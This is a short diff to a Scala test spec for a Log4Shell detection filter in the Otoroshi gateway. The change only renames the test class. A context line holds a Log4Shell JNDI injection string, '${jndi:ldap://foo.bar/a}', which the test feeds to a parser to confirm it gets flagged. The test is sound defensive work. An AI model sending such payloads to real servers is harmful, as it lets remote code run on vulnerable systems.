@@ -11,8 +11,8 @@ import otoroshi.plugins.log4j.Log4jExpressionParser
 import otoroshi.utils.syntax.implicits.BetterJsValue
 import play.api.libs.json.{JsArray, JsObject, Json}
 
-class Log4jShellSpec extends WordSpec with MustMatchers with OptionValues with ScalaFutures with IntegrationPatience {
-  "Log4jShellFilter" should {
+class Log4ShellSpec extends WordSpec with MustMatchers with OptionValues with ScalaFutures with IntegrationPatience {
+  "Log4ShellFilter" should {
     "find bad headers" in {
       Log4jExpressionParser.parseAsExp("'${jndi:ldap://foo.bar/a}").hasJndi.mustBe(true)
       Log4jExpressionParser
